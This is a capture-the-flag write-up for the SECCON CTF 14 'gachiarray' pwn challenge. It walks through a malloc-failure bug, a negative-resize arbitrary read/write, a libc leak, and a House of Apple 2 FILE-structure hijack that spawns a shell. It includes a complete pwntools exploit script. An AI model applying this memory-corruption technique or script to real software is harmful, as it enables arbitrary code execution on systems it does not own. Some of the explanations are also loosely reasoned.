# Gachiarray - Complete Walkthrough & Explanation

**Challenge:** gachiarray (SECCON CTF 14 Quals)  
**Category:** Binary Exploitation (Pwn)  
**Author:** ptr-yudai  
**Solved:** Yes - `SECCON{A=B;print(B);and_now_A_is_not_B_how?}`

---

## Table of Contents
1. [Prerequisites & Setup](#prerequisites--setup)
2. [Understanding the Basics](#understanding-the-basics)
3. [Phase 1: Vulnerability Discovery](#phase-1-vulnerability-discovery)
4. [Phase 2: Arbitrary Read/Write Primitive](#phase-2-arbitrary-readwrite-primitive)
5. [Phase 3: Leaking Libc](#phase-3-leaking-libc)
6. [Phase 4: House of Apple 2 Exploitation](#phase-4-house-of-apple-2-exploitation)
7. [Complete Exploit](#complete-exploit)
8. [Common Confusions Explained](#common-confusions-explained)

---

## Prerequisites & Setup

### Extract Libc from Docker

```bash
# Build container
docker compose up -d

# Get container ID
docker ps

# Copy libc
docker cp <container_id>:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6

# Or extract directly
docker run --rm -v $(pwd):/output ubuntu:24.04 cp /lib/x86_64-linux-gnu/libc.so.6 /output/
```

### Initial Analysis

```bash
# Check binary protections
checksec --file=chall
# Output:
# RELRO: Partial (GOT writable)
# Stack Canary: No
# NX: Enabled (no shellcode)
# PIE: No (fixed addresses)

# Identify file type
file chall

# View disassembly
objdump -d chall | less

# Check relocations/GOT
objdump -R chall
```

---

## Understanding the Basics

### What is malloc()?

**malloc** = Memory allocator that requests memory from the operating system.

```c
int *array = malloc(1000);  // Request 1000 bytes
if (array == NULL) {
    // malloc FAILED - no memory available
}
```

**When does malloc fail?**
- Requesting more memory than available
- Docker limit: `JAIL_MEM=10M` (10 megabytes max)

**Our trigger:**
```python
p32(0xffffffff)  # capacity = 4,294,967,295 integers
# Size needed: 4,294,967,295 × 4 bytes = 17 GB
# Docker limit: 10 MB
# Result: malloc returns NULL
```

### Understanding Packet Format

The program reads **exactly 12 bytes** (3 integers of 4 bytes each):

**Initialization packet:**
```
[capacity] [size] [initial]
  4 bytes   4 bytes  4 bytes
```

**Operation packet:**
```
[op] [index] [value]
 4B    4B      4B
```

**What is p32()?**

`p32()` packs an integer into 4 bytes (32 bits):

```python
from pwn import *
p32(0xffffffff)  # → b'\xff\xff\xff\xff'
p32(3)           # → b'\x03\x00\x00\x00' (little-endian)
p32(0)           # → b'\x00\x00\x00\x00'
```

**Test yourself:**
```python
from pwn import *
print(p32(-1).hex())          # Need signed=True: p32(-1, signed=True)
print(p32(0xffffffff).hex())  # ffffffff
```

---

## Phase 1: Vulnerability Discovery

### The Global Array Structure

```c
struct {
  uint32_t size;        // Number of elements currently in array
  uint32_t capacity;    // Maximum elements array can hold
  int32_t initial;      // Default value for new elements
  int32_t *data;        // POINTER to allocated memory
} g_array;
```

Located at:
- `g_array.size`: `0x404070`
- `g_array.capacity`: `0x404074`
- `g_array.initial`: `0x404078`
- `g_array.data`: `0x404080`

### The Bug in array_init()

**Source code:**
```c
void array_init(pkt_t *pkt) {
  if (pkt->size > pkt->capacity)
    pkt->size = pkt->capacity;

  g_array.data = (int*)malloc(pkt->capacity * sizeof(int));
  
  if (!g_array.data)
    *(uint64_t*)pkt = 0;  // ⚠️ Zeros first 8 bytes of packet

  g_array.size = pkt->size;
  g_array.capacity = pkt->capacity;
  g_array.initial = pkt->initial;
}
```

**Decompiled code (IDA/Ghidra):**
```c
v1 = *pkt;  // Save original capacity to v1
// ...
data = malloc(4LL * v1);
if (!data)
    *(_QWORD *)pkt = 0;  // Zeros pkt->capacity and pkt->size
// ...
g_array = _mm_unpacklo_epi32(
    _mm_cvtsi32_si128(size),     // size = 0 (zeroed)
    _mm_cvtsi32_si128(v1)        // v1 = ORIGINAL capacity!
);
```

**Key insight:** After malloc fails:
- Packet: `capacity=0, size=0, initial=<unchanged>`
- Global: `capacity=<original>, size=0, data=NULL`

This is a **compiler optimization bug** - capacity is saved before malloc and restored after!

### Dynamic Verification with GDB

```bash
# Create test input
python3 << 'EOF'
from pwn import *
with open('test_malloc', 'wb') as f:
    f.write(p32(0xffffffff) + p32(1) + p32(0x42424242))
    f.write(p32(3) + p32(-2, signed=True) + p32(0))
    f.write(b'\x00' * 12)
EOF

# Start GDB
pwndbg chall
```

**Breakpoints:**
```gdb
# After malloc
break *0x401403
commands
  silent
  printf "After malloc: RAX (return value) = 0x%lx\n", $rax
  continue
end

# After setting g_array
break *0x40142b
commands
  silent
  printf "g_array state:\n"
  x/4wx 0x404070
  continue
end

# Run
run < test_malloc
```

**Expected output:**
```
After malloc: RAX (return value) = 0x0  ← malloc failed!
g_array state:
0x404070: 0x00000000  ← size = 0
0x404074: 0xffffffff  ← capacity = original value!
0x404078: 0x42424242  ← initial
0x404080: 0x00000000  ← data = NULL
```

---

## Phase 2: Arbitrary Read/Write Primitive

### The Resize Trick

After malloc fails, we have:
- `g_array.data = NULL`
- `g_array.size = 0`
- `g_array.capacity = 0xffffffff`

**Problem:** To use get/set operations, we need `size > 0`. But resize has this code:

```c
case 3: // resize
  if (new_size > current_size) {  // ⚠️ SIGNED comparison
    for (int i = current_size; i < new_size; i++) {
      data[i] = initial;  // Writes to NULL → crash!
    }
  }
  g_array.size = new_size;
```

**Solution:** Use negative number for resize!

```python
op(p, 3, -2, 0)  # new_size = -2
```

**What happens:**
1. Check: `if (-2 > 0)` → FALSE (negative < 0)
2. Loop **doesn't run** → no crash!
3. But: `g_array.size = -2` which is `0xFFFFFFFE` as unsigned (huge!)

**Why negative numbers work:**

```c
int x = -2;           // Signed: -2
unsigned int y = -2;  // Unsigned: 4294967294 (0xFFFFFFFE)

if (-2 > 0)  // FALSE - loop skipped
```

**Test different values:**
```python
# All these skip the loop:
op(p, 3, -1, 0)     # Works
op(p, 3, -2, 0)     # Works
op(p, 3, -100, 0)   # Works
op(p, 3, -2147483648, 0)  # Works

# This crashes (loop runs):
op(p, 3, 1000, 0)   # Crashes!
```

### Arbitrary Read/Write Mechanism

After resize with negative number:
- `g_array.size = 0xFFFFFFFE` (huge unsigned)
- `g_array.data = NULL` (address 0)

**Get operation (read):**
```c
if (index >= size)  // index >= 0xFFFFFFFE? Almost never true!
  fatal("Out-of-bounds");
  
value = data[index];  // NULL[index] = *(0 + index*4)
```

**Set operation (write):**
```c
if (index >= size)
  fatal("Out-of-bounds");
  
data[index] = value;  // NULL[index] = *(0 + index*4) = value
```

**This gives us:**
- Read from address: `index * 4`
- Write to address: `index * 4`

**Calculate index for any address:**
```python
target_address = 0x404070
index = target_address // 4  # 0x10101C
```

### Testing the Primitive

```python
from pwn import *

def op(p, opcode, idx, val):
    if idx < 0: idx += 2**32
    if val < 0: val += 2**32
    p.send(p32(opcode) + p32(idx) + p32(val))

p = process('./chall')

# Trigger malloc failure
p.send(p32(0xffffffff) + p32(1) + p32(0))
p.recvuntil(b'Initialized')

# Resize with negative
op(p, 3, -2, 0)
p.recvuntil(b'New size')

# Test read from g_array.size (0x404070)
op(p, 1, 0x404070//4, 0)
print(p.recvline())  # Should show: array[1052700] = -2

# Test write to g_array.initial (0x404078)
op(p, 2, 0x404078//4, 0xDEADBEEF)
print(p.recvline())  # Should show: array[1052702] = -559038737

# Verify write worked
op(p, 1, 0x404078//4, 0)
print(p.recvline())  # Should show the value we wrote

p.close()
```

**GDB verification:**
```gdb
break *0x4011d8  # Set operation write
commands
  printf "Writing to: 0x%lx\n", $rdx + $rax*4
  x/1wx $rdx + $rax*4
  continue
end
run < test_input
```

---

## Phase 3: Leaking Libc

### Why We Need a Libc Leak

**ASLR** (Address Space Layout Randomization) randomizes where libc is loaded in memory. We need to know:
- Where `system()` function is located
- Where FILE structures are located

### Finding Leak Targets

```bash
# Check what global pointers exist
objdump -s -j .data chall

# Check relocations
readelf -r chall | grep GLIBC
# Output shows:
# 000000404050  R_X86_64_GLOB_DAT  stdin@@GLIBC_2.2.5
```

**What is stdin?**

`stdin` is a global `FILE*` pointer that points to the standard input FILE structure inside libc.

```c
FILE *stdin;  // At address 0x404050 in binary
              // Points to _IO_2_1_stdin_ in libc
```

### Reading 64-bit Pointers

Our primitive reads **32-bit values**. To read a 64-bit pointer, we need **two reads**:

```
Address 0x404050: [0x12 0x34 0x56 0x78] [0x9A 0xBC 0xDE 0xF0]
                   └── lower 32 bits ──┘ └── upper 32 bits ──┘
```

**Why two reads?**
```python
# Read bytes 0-3
op(p, 1, 0x404050//4, 0)      # Reads: 0x78563412

# Read bytes 4-7
op(p, 1, 0x404050//4 + 1, 0)  # Reads: 0xF0DEBC9A

# Combine them
full_pointer = (upper << 32) | lower  # 0xF0DEBC9A78563412
```

### Handling Signed Integers

The program prints values as **signed 32-bit integers**:

```python
# If printed value is negative, convert to unsigned
lower = int(p.recvline().strip())
if lower < 0:
    lower += 2**32  # Convert: -123456789 → 4171510507
```

**Why this works:**
```python
# Signed representation
x = -1          # In 32 bits: 0xFFFFFFFF
x += 2**32      # Now: 4294967295 (correct unsigned value)
```

### Complete Leak Process

```python
from pwn import *

def op(p, opcode, idx, val):
    if idx < 0: idx += 2**32
    if val < 0: val += 2**32
    p.send(p32(opcode) + p32(idx) + p32(val))

libc = ELF('./libc.so.6')
p = process('./chall')

# Get primitive
p.send(p32(0xffffffff) + p32(1) + p32(0))
p.recvuntil(b'Initialized')
op(p, 3, -2, 0)
p.recvuntil(b'size')

# Read stdin pointer (at 0x404050)
op(p, 1, 0x404050//4, 0)
p.recvuntil(b'= ')
lower = int(p.recvline().strip())
if lower < 0: lower += 2**32

op(p, 1, 0x404050//4 + 1, 0)
p.recvuntil(b'= ')
upper = int(p.recvline().strip())
if upper < 0: upper += 2**32

# Combine to get full pointer
stdin_leak = (upper << 32) | lower
print(f"stdin points to: 0x{stdin_leak:x}")

# Calculate libc base
libc_base = stdin_leak - libc.symbols['_IO_2_1_stdin_']
system_addr = libc_base + libc.symbols['system']

print(f"libc base: 0x{libc_base:x}")
print(f"system:    0x{system_addr:x}")

p.close()
```

### Getting Libc Offsets

```bash
# Extract symbols from libc
python3 << 'EOF'
from pwn import *
libc = ELF('./libc.so.6')
print(f"_IO_2_1_stdin_ offset: 0x{libc.symbols['_IO_2_1_stdin_']:x}")
print(f"system offset: 0x{libc.symbols['system']:x}")
print(f"_IO_list_all offset: 0x{libc.symbols['_IO_list_all']:x}")
EOF
```

**Expected output:**
```
_IO_2_1_stdin_ offset: 0x2038e0
system offset: 0x58750
_IO_list_all offset: 0x2044c0
```

---

## Phase 4: House of Apple 2 Exploitation

### What is _IO_FILE?

In C, file operations use FILE structures:

```c
FILE *stdin;   // Standard input
FILE *stdout;  // Standard output
FILE *stderr;  // Standard error

// FILE is actually _IO_FILE structure
struct _IO_FILE {
  char *_IO_buf_base;      // Buffer pointer (offset 0x0)
  char *_IO_buf_end;       // Buffer end
  // ... many more fields ...
  struct _IO_jump_t *vtable;  // Function pointers (offset 0xd8)
};
```

### What is fflush() and _IO_list_all?

When a program exits, it automatically flushes all open files:

```c
exit(0);
  ↓
_IO_cleanup();
  ↓
_IO_flush_all_lockp();
  ↓
// Walk through linked list of FILE structures
for (FILE *fp = _IO_list_all; fp != NULL; fp = fp->_chain) {
    fp->vtable->__overflow(fp);  // Call function pointer
}
```

**Normal situation:**
```
_IO_list_all → [stdin] → [stdout] → [stderr] → NULL
               ^
               |
           Points to structures in libc
```

### The Attack Strategy

We hijack the exit cleanup process:

1. Create fake `_IO_FILE` structure at `0x404090` (writable memory)
2. Put `"  sh;"` at offset 0 (will be passed as command)
3. Put `system()` address at offset 0x68
4. Set vtable to point to our controlled memory
5. Overwrite `_IO_list_all` to point to our fake FILE
6. Trigger exit → calls `system("  sh;")`

**Attack flow:**
```
_IO_list_all (hijacked)
    ↓
0x404090: Our fake FILE
    - offset 0x0: "  sh;"
    - offset 0x68: system address
    - offset 0xd8: fake vtable
    ↓
exit() walks list
    ↓
Calls vtable->__overflow(fake_FILE)
    ↓
Becomes: system("  sh;")
    ↓
SHELL!
```

### Building the Fake FILE Structure

```python
fake_io_addr = 0x404090

# Build fake _IO_FILE structure
fake_io_file = b"  sh;".ljust(0x8, b"\x00")  # Command at offset 0
fake_io_file += p64(0)*3 + p64(1) + p64(2)   # Flags to pass checks
fake_io_file = fake_io_file.ljust(0x30, b"\x00")
fake_io_file += p64(0)
fake_io_file = fake_io_file.ljust(0x68, b"\x00")
fake_io_file += p64(system_addr)              # Function pointer
fake_io_file = fake_io_file.ljust(0x88, b"\x00")
fake_io_file += p64(libc_base + 0x205700)    # More checks
fake_io_file = fake_io_file.ljust(0xa0, b"\x00")
fake_io_file += p64(fake_io_addr)            # _lock pointer
fake_io_file = fake_io_file.ljust(0xd8, b"\x00")
fake_io_file += p64(0x202228 + libc_base)    # vtable pointer
fake_io_file += p64(fake_io_addr)            # vtable entries
```

**Why these specific offsets?**

These come from analyzing the `_IO_FILE` structure in glibc:
```c
struct _IO_FILE {
  // 0x00: _IO_buf_base (our command string)
  // 0x30: flags that need specific values
  // 0x68: Function pointer called during overflow
  // 0x88: _wide_data pointer (needs valid value)
  // 0xa0: _lock (needs non-NULL)
  // 0xd8: vtable (function table pointer)
};
```

### Writing the Fake Structure

Use our arbitrary write to place the fake FILE at 0x404090:

```python
# Write 4 bytes at a time
for i in range(len(fake_io_file)//4):
    value = u32(fake_io_file[i*4:i*4+4])
    op(p, 2, (fake_io_addr//4) + i, value)
    p.recvuntil(b'array')
```

### Hijacking _IO_list_all

**Why modify through g_array.data?**

We can't directly write to libc memory (read-only). Instead:

1. Write large value to `g_array.data` upper bytes
2. This makes array operations think data is near libc
3. Use normal set operation to overwrite `_IO_list_all`

```python
# Point g_array.data near _IO_list_all
op(p, 2, 0x404080//4 + 1, io_list_all//0x100000000)
p.recvuntil(b'array')

# Now use normal array write to overwrite _IO_list_all
op(p, 2, (io_list_all % 0x100000000)//4, fake_io_addr)
p.recvuntil(b'array')
op(p, 2, (io_list_all % 0x100000000)//4 + 1, 0)
p.recvuntil(b'array')
```

**What this does:**
```
Before: _IO_list_all → stdin (in libc)
After:  _IO_list_all → 0x404090 (our fake FILE)
```

### Triggering the Exploit

Send invalid operation to trigger exit:

```python
op(p, 4, 0, 0)  # Invalid op → exit(0)
                # → _IO_flush_all_lockp()
                # → system("  sh;")
```

---

## Complete Exploit

```python
#!/usr/bin/env python3
from pwn import *
import sys

def op(p, opcode, idx, val):
    """Send operation packet"""
    if idx < 0: idx += 2**32
    if val < 0: val += 2**32
    p.send(p32(opcode) + p32(idx) + p32(val))

# Load libc
libc = ELF('./libc.so.6')

# Connect
if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE':
    p = remote('gachiarray.seccon.games', 5000)
    log.info("Connected to remote")
else:
    p = process('./chall')
    log.info("Started local process")

# ========== PHASE 1: Get Arbitrary R/W ==========
log.info("Phase 1: Triggering malloc failure")
p.send(p32(0xffffffff) + p32(3) + p32(0))
p.recvuntil(b'Initialized')

log.info("Phase 1: Resizing with negative number")
op(p, 3, -2, 0x1337)
p.recvuntil(b"New size set to -2\n")
log.success("Got arbitrary read/write primitive!")

# ========== PHASE 2: Leak Libc ==========
log.info("Phase 2: Leaking libc from stdin@GOT")

# Read lower 32 bits
op(p, 1, 0x404050//4, 0)
p.recvuntil(b"array[1052692] = ")
libc_leak_lower = int(p.recvline().strip())
if libc_leak_lower < 0:
    libc_leak_lower += 2**32

# Read upper 32 bits
op(p, 1, 0x404050//4 + 1, 0)
p.recvuntil(b"array[1052693] = ")
libc_leak_upper = int(p.recvline().strip())
if libc_leak_upper < 0:
    libc_leak_upper += 2**32

# Calculate addresses
stdin_leak = (libc_leak_upper << 32) | libc_leak_lower
libc_base = stdin_leak - libc.symbols['_IO_2_1_stdin_']
system_addr = libc_base + libc.symbols['system']
io_list_all = libc_base + libc.symbols["_IO_list_all"]

log.success(f"stdin leak:     0x{stdin_leak:x}")
log.success(f"libc base:      0x{libc_base:x}")
log.success(f"system:         0x{system_addr:x}")
log.success(f"_IO_list_all:   0x{io_list_all:x}")

# ========== PHASE 3: House of Apple 2 ==========
log.info("Phase 3: Building fake _IO_FILE structure")

fake_io_addr = 0x404090

# Build fake FILE
fake_io_file = b"  sh;".ljust(0x8, b"\x00") 
fake_io_file += p64(0)*3 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(0x30, b"\x00")
fake_io_file += p64(0)
fake_io_file = fake_io_file.ljust(0x68, b"\x00")
fake_io_file += p64(system_addr)
fake_io_file = fake_io_file.ljust(0x88, b"\x00")
fake_io_file += p64(libc_base + 0x205700)
fake_io_file = fake_io_file.ljust(0xa0, b"\x00")
fake_io_file += p64(fake_io_addr)
fake_io_file = fake_io_file.ljust(0xd8, b"\x00")
fake_io_file += p64(0x202228 + libc_base)
fake_io_file += p64(fake_io_addr)

log.info("Writing fake FILE to 0x404090...")
for i in range(len(fake_io_file)//4):
    op(p, 2, (fake_io_addr//4) + i, u32(fake_io_file[i*4:i*4+4]))
    p.recvuntil(b"array")

log.info("Hijacking _IO_list_all...")
op(p, 2, 0x404080//4 + 1, io_list_all//0x100000000)
p.recvuntil(b"array")
op(p, 2, (io_list_all)%0x100000000//4, fake_io_addr)
p.recvuntil(b"array")
op(p, 2, (io_list_all)%0x100000000//4 + 1, 0)
p.recvuntil(b"array")

# ========== TRIGGER ==========
log.info("Triggering exploit (sending invalid op)...")
op(p, 4, 0, 0)

log.success("Shell should spawn now!")
p.interactive()
```

**Save as `exploit.py` and run:**
```bash
# Local test
python3 exploit.py

# Get flag from remote
python3 exploit.py REMOTE
```

**Expected output:**
```
[+] Connected to remote
[*] Phase 1: Triggering malloc failure
[*] Phase 1: Resizing with negative number
[+] Got arbitrary read/write primitive!
[*] Phase 2: Leaking libc from stdin@GOT
[+] stdin leak:     0x7f...8e0
[+] libc base:      0x7f...000
[+] system:         0x7f...750
[+] _IO_list_all:   0x7f...4c0
[*] Phase 3: Building fake _IO_FILE structure
[*] Writing fake FILE to 0x404090...
[*] Hijacking _IO_list_all...
[*] Triggering exploit (sending invalid op)...
[+] Shell should spawn now!
$ ls
flag-3c7e7d5c1c758a39e689600fa104be50.txt
$ cat flag*
SECCON{A=B;print(B);and_now_A_is_not_B_how?}
```

---

## Common Confusions Explained

### Q1: How does malloc fail?

**A:** Docker sets `JAIL_MEM=10M` (10 megabytes). When we request 17GB via `capacity=0xffffffff`, malloc cannot allocate that much memory and returns NULL.

### Q2: Why p32(0xffffffff) and not just send "-1"?

**A:** The program reads **binary data**, not text. `p32()` converts the integer to 4 bytes:
```python
p32(0xffffffff) → b'\xff\xff\xff\xff'  # Binary data
"-1"            → b'\x2d\x31'          # Text characters
```

### Q3: Why resize with -2 specifically?

**A:** Any negative number works (-1, -2, -100). The important part is that it's negative so the signed comparison `if (new_size > 0)` returns FALSE, skipping the write loop that would crash.

### Q4: Why do we need both reads for stdin?

**A:** Pointers are 64 bits (8 bytes), but our primitive reads 32-bit values (4 bytes). We need two reads to get the full pointer:
```
Read 1: bytes 0-3 (lower 32 bits)
Read 2: bytes 4-7 (upper 32 bits)
Combine: (upper << 32) | lower
```

### Q5: What does "if lower < 0: lower += 2**32" do?

**A:** The program prints signed integers. If negative, we convert to unsigned:
```python
-123456789 + 2**32 = 4171510507  # Correct unsigned representation
```

### Q6: Why do we need system() address?

**A:** To execute shell commands. We call `system("  sh;")` to spawn a shell.

### Q7: What is _IO_list_all for?

**A:** It's the head of a linked list containing all open FILE structures. When the program exits, it walks this list and calls functions on each FILE. We hijack it to call `system()` instead.

### Q8: How do we write to _IO_list_all in libc?

**A:** We use a trick:
1. Modify `g_array.data` to point near libc
2. This makes array operations work on libc memory
3. Use normal set operation to overwrite `_IO_list_all`

The key is `op(p, 2, 0x404080//4 + 1, io_list_all//0x100000000)` which sets the upper bytes of `g_array.data`.

### Q9: Why "  sh;" and not just "sh"?

**A:** The fake FILE structure places this string at offset 0, and later it gets passed as an argument. The extra spaces ensure proper alignment and the semicolon allows command chaining.

### Q10: What triggers the system() call?

**A:** Sending invalid operation (op=4) causes the program to call `exit(0)`. During exit cleanup, libc flushes all files by walking `_IO_list_all` and calling function pointers. Since we hijacked the list to point to our fake FILE with `system` as the function pointer, it calls `system("  sh;")`.

---

## Skills Learned

### 1. Static Analysis
- Reading decompiled code carefully
- Spotting compiler optimization bugs
- Understanding signed vs unsigned comparisons
- Identifying missing error checks

### 2. Dynamic Analysis
- Using GDB/pwndbg to verify assumptions
- Setting conditional breakpoints
- Examining memory layout
- Tracking malloc return values

### 3. Exploitation Techniques
- Triggering malloc failures
- Signed integer bypass tricks
- NULL pointer arbitrary read/write
- Leaking addresses from GOT/data sections
- FILE structure exploitation (House of Apple 2)

### 4. Python/Pwntools Skills
- Packing integers with p32/p64
- Handling signed/unsigned conversions
- Reading responses and parsing output
- Building multi-stage exploits

---

## References & Further Reading

- [House of Apple writeup](https://github.com/bash-c/slides/blob/master/House_of_Apple.pdf)
- [FILE structure exploitation](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/)
- [Original challenge writeup](https://blog.rosay.xyz/seccon-14-quals-writeup/)
- [SECCON CTF 14 Quals scoreboard](https://score.ctf.seccon.jp/)

---

## Flag

```
SECCON{A=B;print(B);and_now_A_is_not_B_how?}
```

The flag references the compiler optimization bug where the capacity is saved to a variable before malloc, then restored after - leading to the situation where "A=B" but later "A is not B".
